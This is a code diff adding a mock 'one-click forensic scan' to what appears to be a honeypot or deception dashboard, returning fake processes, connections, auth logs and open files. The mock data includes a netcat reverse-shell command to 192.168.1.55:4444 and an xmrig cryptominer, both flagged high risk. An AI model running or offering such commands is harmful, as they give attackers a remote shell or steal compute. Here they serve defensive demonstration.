@@ -1,6 +1,6 @@
 
 
-import { Actor, ActorStatus, LogEntry, LogLevel, ProxyGateway, CloudTrap, ActiveTunnel, PendingActor, ProvisioningStatus, DevicePersona, WifiNetwork, BluetoothDevice } from '../types';
+import { Actor, ActorStatus, LogEntry, LogLevel, ProxyGateway, CloudTrap, ActiveTunnel, PendingActor, ProvisioningStatus, DevicePersona, WifiNetwork, BluetoothDevice, ForensicSnapshot, ForensicProcess } from '../types';
 
 const LOCATIONS = ['Tel Aviv HQ', 'New York Branch', 'London DC', 'Frankfurt AWS'];
 const PROCESSES = ['sshd', 'kernel', 'vpp-agent', 'udp_pot', 'cowrie'];
@@ -483,4 +483,48 @@ export const generateMockBluetooth = (actors: Actor[]): BluetoothDevice[] => {
         }
     });
     return devices;
+};
+
+// NEW: One-Click Forensic Mock
+export const performForensicScan = async (actorId: string): Promise<ForensicSnapshot> => {
+    return new Promise((resolve) => {
+        setTimeout(() => {
+            const processes: ForensicProcess[] = [
+                { pid: '1', user: 'root', cpu: '0.1', mem: '0.5', command: '/sbin/init', risk: 'LOW' },
+                { pid: '812', user: 'root', cpu: '0.2', mem: '1.2', command: '/usr/sbin/sshd -D', risk: 'LOW' },
+                { pid: '2023', user: 'pi', cpu: '0.0', mem: '0.8', command: '-bash', risk: 'LOW' },
+                // Suspicious items
+                { pid: '4452', user: 'www-data', cpu: '45.2', mem: '12.4', command: './xmrig --donate-level 1', risk: 'HIGH' },
+                { pid: '4490', user: 'www-data', cpu: '0.1', mem: '0.2', command: 'nc -e /bin/bash 192.168.1.55 4444', risk: 'HIGH' }
+            ];
+
+            const connections = [
+                'tcp   ESTAB      0      0          192.168.1.101:22          10.0.0.5:54322         users:(("sshd",pid=812,fd=3))',
+                'tcp   ESTAB      0      0          192.168.1.101:4444        192.168.1.55:8888      users:(("nc",pid=4490,fd=3))',
+                'tcp   LISTEN     0      128        0.0.0.0:80                0.0.0.0:*              users:(("apache2",pid=900,fd=3))'
+            ];
+
+            const authLogs = [
+                'Oct 12 04:12:01 sshd[1202]: Accepted password for pi from 10.0.0.5 port 54322 ssh2',
+                'Oct 12 04:12:01 systemd-logind[455]: New session 32 of user pi.',
+                'Oct 12 04:15:22 sudo: pi : TTY=pts/0 ; PWD=/home/pi ; USER=root ; COMMAND=/bin/bash',
+                'Oct 12 04:15:22 sudo: pam_unix(sudo:session): session opened for user root by pi(uid=0)',
+                'Oct 12 04:20:01 CRON[2201]: pam_unix(cron:session): session opened for user root by (uid=0)'
+            ];
+
+            const openFiles = [
+                'apache2  900 root  cwd   DIR  179,2     4096      2 /',
+                'nc      4490 www-data  txt   REG  179,2    31248 14221 /usr/bin/nc.openbsd',
+                'xmrig   4452 www-data  cwd   DIR  179,2     4096  3321 /tmp/.X11-unix'
+            ];
+
+            resolve({
+                timestamp: new Date(),
+                processes,
+                connections,
+                authLogs,
+                openFiles
+            });
+        }, 2000);
+    });
 };
